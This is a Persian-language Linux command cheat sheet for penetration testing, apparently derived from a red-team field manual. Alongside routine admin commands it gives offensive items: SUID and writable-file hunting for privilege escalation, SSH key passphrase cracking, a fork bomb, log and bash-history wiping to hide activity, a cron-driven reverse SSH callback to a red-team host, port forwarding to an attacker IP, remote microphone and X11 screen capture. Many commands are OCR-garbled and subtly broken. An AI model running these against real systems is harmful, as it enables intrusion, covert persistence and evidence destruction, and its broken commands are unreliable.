---
layout: default
published: true
---

# لینوکس

## دستورات شبکه

| **دستور** | **توضیح** |
| :--- | :--- |
| watch ss -tp | ارتباطات شبکه |
| netstat -ant | ارتباطات tcp یا udp -anu=udp |
| netstat -tulpn | ارتباطات به همراه PIDs |
| lsof -i | ارتباطات برقرار |
| smb:// ip /share | دسترسی محیط اشتراکی smb  |
| share user x.x.x.x c$ | Mount نمودن محیط اشتراکی ویندوزی  |
| smbclient -0 user\\ ip \ share | اتصال به SMB |
| ifconfig eth\# ip I cidr | تنظیم IP و netmask |
| ifconfig eth0:1 ip I cidr | تنظیم interface مجازی |
| route add default gw gw lp | تنظیم GW |
| ifconfig eth\# mtu \[size\] | تغییر اندازه MTU |
| export MAC=xx: XX: XX: XX: XX: XX | تغییر MAC |
| ifconfig int hw ether MAC | تغییر MAC |
| macchanger -m MAC int | تغییر Mac در Backtrack  |
| iwlist int scan | پویشگر wifi |
| nc -lvvp port | گوش دادن به port خاص |
| python3 -m http.server port | ایجاد وبسرور |
| dig -x ip | شناسایی دامین های یک ip |
| host ip | شناسایی دامین های یک ip |
| host -t SRV \_ service tcp.url.com | شناسایی SRV دامین |
| dig @ ip domain -t AXrR | شناسایی DNS Zone Xfer |
| host -1 domain namesvr | شناسایی DNS Zone Xfer |
| ip xfrm state list | نمایش VPN موجود |
| ip addr add ip I cidr aev ethO | اضافه نمودن 'hidden' interface |
| /var/log/messages I grep DHCP | لیست DHCP  |
| tcpkill host ip and port port | مسدود نمودن ip:port |
| echo "1" /proc/sys/net/ipv4/ip forward | فعال سازی IP Forwarding |
| echo ''nameserver x.x.x.x''  /etc7resolv.conf | اضافه نمودن سرور DNS |
| showmount -e ip | نمایش نقاط mount شده |
| mkdir /site_backups;mount -t nfs ip:/ /site_backup | mount مسیر به اشتراک گذشته شده ip|


## اطلاعات سیستم

| **دستور** | **توضیح** |
| :--- | :--- |
| nbstate -A -ip | دریافت hostname برای ip |
| id | نام کاربری فعلی |
| w | کاربر وارد شده |
| who -a | اطلاعات کاربر |
| last -a | آخرین کاربر وارد شده |
| ps -ef | پردازش های موجود سیستم \(یا استفاده از top\) |
| df -h | میزان استفاده از دیسک \(یا استفاده از free\) |
| uname -a | نمایش  نسخه کرنل به همراه ساختار پردازنده |
| mount | Mount نمودن فایل سیستم |
| getent passwd | نمایش لیست کاربران |
| PATH~$PATH:/home/mypath | اضافه نمودن متغیر به PATH |
| kill pid | حذف فرآیند با pid |
| cat /etc/issue | نمایش اطلاعات سیستم عامل |
| cat /etc/'release' | نمایش اطلاعات نسخه سیستم عامل |
| cat /proc/version | نمایش طلاعات نسخه کرنل  |
| rpm --query -all | بسته های نصب شده \(در Redhat\) |
| rpm -ivh ' .rpm | نصب بسته های rpm \(برای حذف -e=remove\) |
| dpkg -get-selections | بسته های نصب شده \(در Ubuntu\) |
| dpkg -I '.deb | نصب بسته های DEB \(برای حذف -r=remove\) |
| pkginfo | بسته های نصب شده \(در Solaris\) |
| which tscsh/csh/ksh/bash | نمایش مسیر های فایل های اجرایی |
| chmod -so tcsh/csh/ksh | غیر فعال سازی شل و همچنین اجبار به استفاده از bash |
| find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | پیدا نمودن فایل های دارای suid |
| find / -uid 0 -perm -4000 -type f 2>/dev/null | پیدا نمودن فایل های دارای suid |
| find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null | نمایش فایل های writable |


## دستورات کاربردی

| **دستور** | **توضیح** |
| :--- | :--- |
| python -c "import pty;pty.spawn('/bin/bash')" | شل interactive |
| wget http:// url -0 url.txt -o /dev/null | گرفتن آدرس |
| rdesktop ip | دسترسی به دسکتاپ ip |
| scp /tmp/file user@x.x.x.x:/tmp/file | ارسال فایل |
| scp user@ remoteip :/tmp/file /tmp/file | دریافت فایل |
| useradd -m user | اضافه نموده کاربر |
| passwd user | تغییر کلمه عبور کاربر |
| rmuser unarne | حذف کاربر |
| script -a outfile | ضبط شل : Ctrl-D برای توقف |
| apropos subject | دستورات مرتبط |
| history | تاریخچه دستورات کاربر |
| ! num | خطوط اجرایی در history |
| ssh2john.py id_rsa > ssh-key | پیدا نمودن passphrase |
| john ssh-key | پیدا نمودن passphrase |
| ssh -i id_rsa user@ip | وصل شدن با کلید و passphrase |
| id -u <username> | دریافت id کاربر |
| cut -d: -f3 < <(getent group GROUPNAME) | دریافت id گروه |

## دستورات فایل

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">diff filel file2</td>
      <td style="text-align:left">مقایسه دو فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">rm -rf dir</td>
      <td style="text-align:left">حذف اجباری فولدر به صورت تو در تو</td>
    </tr>
    <tr>
      <td style="text-align:left">shred -f -u file</td>
      <td style="text-align:left">بازنوسی و یا حذف فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">touch -r ref file</td>
      <td style="text-align:left">تطبیق timestamp مربوط به ref_ file</td>
    </tr>
    <tr>
      <td style="text-align:left">touch -t YYYYMMDDHHSS file</td>
      <td style="text-align:left">تنظیم timestamp فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">sudo fdisk -1</td>
      <td style="text-align:left">لیست درایور های متصل شده</td>
    </tr>
    <tr>
      <td style="text-align:left">mount /dev/sda# /mnt/usbkey</td>
      <td style="text-align:left">Mount نمودن دستگاه های usb</td>
    </tr>
    <tr>
      <td style="text-align:left">md5sum -t file</td>
      <td style="text-align:left">محاسبه هش md5</td>
    </tr>
    <tr>
      <td style="text-align:left">echo -n &quot;str&quot; | md5sum</td>
      <td style="text-align:left">تولید نمودن هش md5</td>
    </tr>
    <tr>
      <td style="text-align:left">shalsum file</td>
      <td style="text-align:left">هش SHAl مربوط به فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">sort -u</td>
      <td style="text-align:left">مرتبط و نمایش خطوط  یکتا</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -c &apos;&apos;str&apos;&apos; file</td>
      <td style="text-align:left">جمع خطوط w/ &apos;&apos;str&apos;&apos;</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -Hnri word * | vim -</td>
      <td style="text-align:left">جست و جو کلمه مورد نظر در فایل ها به همراه نام فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -rial word</td>
      <td style="text-align:left">فایل های حاوی کلمه مورد نظر</td>
    </tr> 
    <tr>
      <td style="text-align:left">tar cf file.tar files</td>
      <td style="text-align:left">ایجاد .tar از فایل ها</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xf file.tar</td>
      <td style="text-align:left">اسختراج .tar</td>
    </tr>
    <tr>
      <td style="text-align:left">tar czf file.tar.gz files</td>
      <td style="text-align:left">ایجاد .tar.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xzf file.tar.gz</td>
      <td style="text-align:left">استخراج .tar.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">tar cjf file.tar.bz2 files</td>
      <td style="text-align:left">ایجاد .tar.bz2</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xjf file.tar.bz2</td>
      <td style="text-align:left">استخراج .tar.bz2</td>
    </tr>
    <tr>
      <td style="text-align:left">gzip file</td>
      <td style="text-align:left">فشرده سازی و تغییر نام فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">gzip -d file. gz</td>
      <td style="text-align:left">عدم فشرده سازی file.gz</td>
    </tr>
    <tr>
      <td style="text-align:left">upx -9 -o out.exe orig.exe</td>
      <td style="text-align:left">دریافت UPX packs مربوط به orig.exe</td>
    </tr>
    <tr>
      <td style="text-align:left">zip -r zipname.zip \Directory\&apos;</td>
      <td style="text-align:left">ایجاد zip</td>
    </tr>
    <tr>
      <td style="text-align:left">dd skip=lOOO count=2000 bs=S if=file of=file</td>
      <td style="text-align:left">جداسازی 1 تا 3 کیلوبایت از فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">split -b 9K file prefix</td>
      <td style="text-align:left">جداسازی بخش های 9 کیلیوبایتی از فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">awk &apos;sub(&quot;$&quot;.&quot;\r&quot;)&apos; unix.txt win.txt</td>
      <td
      style="text-align:left">فایل txt سازگار ویندوز</td>
    </tr>
    <tr>
      <td style="text-align:left">find -i -name file -type &apos;.pdf</td>
      <td style="text-align:left">جست و جو فایل های  PDF</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>find I -perm -4000 -o -perm -2000 -exec ls -</p>
        <p>ldb {} \;</p>
      </td>
      <td style="text-align:left">جست و جو setuid فایل ها</td>
    </tr>
    <tr>
      <td style="text-align:left">dos2unix file</td>
      <td style="text-align:left">تغییر به فرمت *nix</td>
    </tr>
    <tr>
      <td style="text-align:left">file file</td>
      <td style="text-align:left">تعیین نوع و فرمت فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">chattr (+/-)i file</td>
      <td style="text-align:left">تنظیم و یا عدم تنظیم بیت immutable</td>
    </tr>
    <tr>
      <td style="text-align:left">while [ $? -eq 0 ]; do cd flag/; done</td>
      <td style="text-align:left">ورود به پوشه بی نهایت تو در تو</td>
    </tr>
  </tbody>
</table>

## دستورات متفرقه

| **دستور** | **توضیح** |
| :--- | :--- |
| unset HISTFILE | غیرفعال نموده گزاراشات در history |
| ssh user@ ip arecord - I aplay - | ضبط میکروفن از راه دور |
| gcc -o outfile myfile.c | Compile نمودن C,C++ |
| init 6 | راه اندازی مجدد \(0 = خاموش نمودن\) |
| cat /etc/ 1 syslog 1 .conf 1 grep -v ''"\#'' | لیست فایل های گزاراشات |
| grep 'href=' file 1 cut -d"/" -f3 I grep url \| sort -u | جداسازی لینک های url.com |
| dd if=/dev/urandom of= file bs=3145728 count=100 | ایجاد فایل 3 مگابایتی |

## دستورات کنترل کننده



| **دستور** | **توضیح** |
| :--- | :--- |
| echo "" /var/log/auth.log | حذف فایل auth.log |
| echo '''' -/.bash history | حذف تاریخچه نشست کاربر جاری |
| rm -/.bash histor/ -rf | حذف فایل .bash\_history |
| history -c | حذف تاریخچه نشست کاربر جاری |
| export HISTFILESIZE=0 | تعیین حداکثر خطوط فایل تاریخچه به صفر |
| export HISTSIZE=0 | تعیین حداکثر دستورات فایل تاریخچه به صفر |
| unset HISTFILE | حذف تاریخچه \(برای اعمال نیاز به ورود مجدد است\) |
| kill -9 $$ | حذف نشست جاری |
| ln /dev/null -/.bash\_historj -sf | به صورت دائم و همیشگی کلیه دستورات تاریخچه به /dev/null فرستاده شود |

## ساختار فایل سیستم

| **موقعیت** | **توضیح** |
| :--- | :--- |
| /bin | فایل های باینری سیستم |
| /boot | فایل های مرتبط با فرآیند بوت |
| /dev | Interface های مربوط به دستگاه های سیستم |
| /etc | فایل های تنظیمات سیستم |
| /home | مکان پایه ای برای کاربران و کتابخانه ها |
| /opt | کتابخانه های ضروری نرم افزار ها |
| /proc | فرآیند های اجرایی و سیستمی |
| /root | مسیر پایه برای کاربر root |
| /sbin | فایل های اجرایی کاربر root |
| /tmp | فایل ها موقت |
| /usr | فایل های نه چندان ضروری |
| /var | فایل متغیر های سیستم |

## فایل ها

| **فایل** | **توضیح** |
| :--- | :--- |
| /etc/shadow | هش کاربران محلی |
| /etc/passwd | کاربران محلی |
| /etc/group | گروه های محلی |
| /etc/rc.d | سرویس های راه انداز |
| /etc/init.d | سرویس ها |
| /etc/hosts | لیست hostname ها و  IP ها |
| /etc/HOSTNAME | نمایش hostname به همراه domain |
| /etc/network/interfaces | ارتباطات شبکه ای |
| /etc/profile | متغیر های محیطی سیستم |
| /etc/apt/sources.list | لیست سورس های توزیع ubuntu |
| /etc/resolv.conf | تنظیمات namserver |
| /horne/ user /.bash history | تاریخچه bash \(همچنین در /root/\) |
| /usr/share/wireshark/manuf | سازنده MAC |
| -/.ssh/ | محل keystore های ssh  |
| /var/log | فایل گزارشات سیستم \(برای Linux\) |
| /var/adrn | فایل گزارشات سیستم \(برای Unix\) |
| /var/spool/cron | لیست فایل های در cron |
| /var/log/apache/access.log | گزارشات ارتباطات apache |
| /etc/fstab | فایل اطلاعات ثابت سیستم |

## اسکریپت نویسی

### ایجاد Ping sweep

```text
for x in {1 .. 254 .. l};do ping -c 1 1.1.1.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done
```

### خودکار سازی فرآیند domain name resolve در اسکریپت bash 

```text
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l};do
host $range.$ip lgrep " name pointer " lcut -d"
done
```

### ایجاد Fork bomb \(ایجاد فرآیند برای crash شدن سیستم\)

```text
: (){:|: & };:
```

### فرآیند dns reverse lookup

```text
for ip in {1 .. 254 .. 1}; do dig -x 1.1.1.$ip | grep $ip
dns.txt; done;
```

### اسکریپت مسدود نمدن Ip 

```text
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while
$i -le 253 l
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa
else
echo "IP NOT BANNED: 192.168.1.$i"
fi
i='expr $i +1`
done
```

### ایجاد SSH Callback

```text
Set up script in crontab to callback every X minutes.
Highly recommend YOU
set up a generic user on red team computer (with no shell privs).
Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback: script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS=''domainl.com domain2.com domain3.com''
for LIVEHOST in SHOSTS;
do
    COUNT=S(ping -c2 $LIVEHOST | grep 'received' | awk -F','{ print $2 } '
    | awk ' ( print $1 | ')
    if [ [ $COUNT -gt 0 ] ] ; then
    ssh -R $(REMLIS}:localhost:22 -i
    "/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi
```

## دستور Iptables

استفاده iptable برای ipv6

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">iptables-save -c file</td>
      <td style="text-align:left">استخراج قوانین iptable و ذخیره در فایل</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables-restore file</td>
      <td style="text-align:left">بازیابی قوانین iptables</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -L -v --line-numbers</td>
      <td style="text-align:left">لیست کلیه قوانین به همراه شماره خط آن</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -F</td>
      <td style="text-align:left">راه اندازی مجدد کلیه قوانین</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>iptables -P INPUT/FORWARD/OUTPUT</p>
        <p>ACCEPT/REJECT/DROP</p>
      </td>
      <td style="text-align:left">تغییر سیسات در صورت عدم احراز قوانین</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -A INPUT -i interface -m state --state RELATED,ESTABLcSHED -j
        ACCEPT</td>
      <td style="text-align:left">اجازه به اتصالات برقرار در INPUT</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -D INPUT 7</td>
      <td style="text-align:left">حذف 7 لایه از قوانین inbound</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -t raw -L -n</td>
      <td style="text-align:left">افزایش بهره وری با غیر فعال سازی statefulness</td>
    </tr>
    <tr>
      <td style="text-align:left">iptables -P INPUT DROP</td>
      <td style="text-align:left">حذف کلیه packet ها</td>
    </tr>
  </tbody>
</table>

## اجازه به ssh و پورت 22 در outbound

```text
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state
NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i
iface -p tcp --sport 22 -m state --state
ESTABLISHED -j ACCEPT
```

## اجازه به ICMP در outband

```text
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT
```

## ایجاد Port forward

```text
echo "1" /proc/sys/net/ipv4/lp forward
# OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport
443 -to-destination attk ip :443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet
cidr -d attackip --dport 443 -to-source pivotip
iptables -t filter -I FORWARD 1 -j ACCEPT
```

## اجازه به 1.1.1.0/24 و پورت 80,443 و ایجاد گزارش در  /var/log/messages

```text
iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW
-p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o ethO -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED "
iptables -A LOGGING -j DROP
```

## فایل Update-rc.d

بررسی و ایجاد راه انداز

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">service --status-all</td>
      <td style="text-align:left">
        <p>[+] Service starts at boot</p>
        <p>[-] Service does not start</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">service service start</td>
      <td style="text-align:left">شروع سرویس</td>
    </tr>
    <tr>
      <td style="text-align:left">service service stop</td>
      <td style="text-align:left">متوقف نمودن سرویس</td>
    </tr>
    <tr>
      <td style="text-align:left">service service status</td>
      <td style="text-align:left">بررسی وضیعت سرویس</td>
    </tr>
    <tr>
      <td style="text-align:left">update-rc.d -f service remove</td>
      <td style="text-align:left">حذف سرویس موجود راه اندازی سیستم (-f برای فایل /etc/init.d در صورتی که از قبل موجود باشد)</td>
    </tr>
    <tr>
      <td style="text-align:left">update-rc.d service defaults</td>
      <td style="text-align:left">اضافه نموده سرویس در راه اندازی سیستم</td>
    </tr>
  </tbody>
</table>

## Chkconfig

موجود در توزیع های مانند  red hat مانند centos و oracle



| **دستور** | **توضیح** |
| :--- | :--- |
| chkconfig --list | لیست سرویس های موجود و وضیعت اجرا |
| chkconfig service -list | وضیعت یک سرویس |
| chkconfig service on \[--level 3\] | اضافه نمودن سرویس \[میتوان لایه آن را هم مشخص نمود\] |
| chkconfig service off \[--level 3\] e.g. chkconfig iptables off | حذف سرویس |

## دستور Screen

| **دستور** | **توضیح** |
| :--- | :--- |
| screen -S name | ایجاد یک screen جدید با اسم |
| screen -ls | لیست screen در حال اجرا |
| screen -r name | الحاق به screen با نام |
| screen -S name -X cmd | ارسال دستور به screen با نام |
| C-a ? | لیست کلید های ترکیبی \(help\) |
| C-a d | رفع الحاق |
| C-a D D | رفع الحاق و خروج |
| C-a c | ایجاد یک پنجره جدید |
| C-a C-a | تغییر به آخرین پنجره |
| C-a ' num\|name | تغییر به پنجره با اسم |
| C-a " | نمایش لیست پنجره و تغییرات |
| C-a k | حذف پنجره فعلی |
| C-a S | جداسازی افقی نمایشگر |
| C-a V | جداسازی عمودی نمایشگر |
| C-a tab | پرش به آخرین نمایشگر |
| C-a X | حذف بخش فعلی |
| C-a Q | حذف تمامی بخش ها به غیر بخش فعلی |

## X11

### ظبط از راه دور پنجره X11 و تغییر فرمت آن به JPG

```text
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
```

### باز نمودن X11 در حالت stream

```text
xwd -display 1.1.1.1:0 -root -silent -out x11dump
Read dumped file with xwudtopnm or GIMP
```

## دستور TCPDump

### ضبط بسته های در eth0 و تغییر آن ازASCII و hex و ذخیره آن در فایل

```text
tcpdump -i ethO -XX -w out.pcap
```

### ضبط کلیه ترافیک های 2.2.2.2

```text
tcpdump -i ethO port 80 dst 2.2.2.2
```

### نمایش کلیه ارتباطات ip

```text
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24
```

## نمایش کلیه خروجی های ping

```text
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
```

### ضبط 50 بسته dns و نمایش timestamp

```text
tcpdump -i ethO -c 50 -tttt 'udp and port 53'
```

## دستورات پیش فرض kali

### معادل WMIC

```text
wmis -U DOMAIN\ user % password //DC cmd.exe /c command
```

### Mount نمودن فضای اشتراکی SMB

```text
# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
mount.cifs // ip /share /mnt/share -o
user= user ,pass= pass ,sec=ntlmssp,domain= domain ,rw
```

### بروز رسانی KALI

```text
apt-get update
apt-get upgrade
```

### بررسی سیستم عامل برای امکان ارتقا دسترسی

```text
https://github.com/rebootuser/LinEnum
Example: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

### لیست کلیه فرآیند ها با دسترسی root

```text
https://github.com/DominicBreuker/pspy
For example: ./pspy64 -pf -i 1000 
```


## دستور PFSENSE


| **دستور** | **توضیح** |
| :--- | :--- |
| pfSsh.php | شل pfSense |
| pfSsh.php playback enableallowallwan | اجازه اتصال به اتصالات inbound در WAN \(اضافه نمودن قوانین مخفی به  قوانین WAN \) |
| pfSsh.php playback enablesshd | فعال سازی inbound/outbound ssh|
| pfctl -sn | نمایش قوانین NAT |
| pfctl -sr | نمایش قوانین فیلتر |
| pfctl -sa | نمایش کلیه قوانین |
| viconfig | وایرایش تنظیمات |
| rm /tmp/config.cache | حدف حافظه پنهان \(یا پشتیبان\) تنظیمات بعد اجرا آن |
| /etc/rc.reload\_all | بارگیری مجدد کل پیکربندی |

## سیستم عامل SOLARIS

| **دستور** | **توضیح** |
| :--- | :--- |
| ifconfig -a | لیست کلیه interface ها |
| netstat -in | لیست کلیه interface ها |
| ifconfig -r | لیست Route ها |
| ifconfig eth0 dhcp | شروع DHCP در کاربر |
| ifconfig eth0 plumb up ip netmask nmask | تنظیم IP |
| route add default ip | تنظیم gateway |
| logins -p | لیست کاربرن و کلمه عبور ها |
| svcs -a | لیست کلیه سرویس ها به همراه وضیعت |
| prstat -a | وضیعت فرآیند ها \(همچنین دستورtop\) |
| svcadm start ssh | آغاز سرویس SSH |
| inetadm -e telnet \(-d for disable\) | فعال سازی telnet |
| prtconf I grep Memorj | مجموع حافظه فیزیکی |
| iostat -En | اندازه Hard disk |
| showrev -c /usr/bin/bash | اطلاعات به صورت باینری |
| shutdown -i6 -g0 -y | راه اندازی مجدد سیستم system |
| dfmounts | لیست کاربران متصل به NFS |
| smc | مدیریت GUI |
| snoop -d int -c pkt \# -o results.pcap | ضبط Packet |
| /etc/vfstab | جدول فایل سیستم عای mounte شده |
| /var/adm/logging | گزارشات لیست تلاش های ورود به سیستم |
| /etc/default/' | تنظیمات پیش فرض |
| /etc/system | ماژول و تنظیمات کرنل |
| /var/adm/messages | مسیر syslog |
| /etc/auto ' | فایل تنظیمات Automounter  |
| /etc/inet/ipnodes | فایل هاست های IPv4 و IPv6 |

## فایل های cache مهم

| **فایل** | **توضیحات** |
| :--- | :--- |
| ~/.viminfo | فایل ویرایشگر vim |
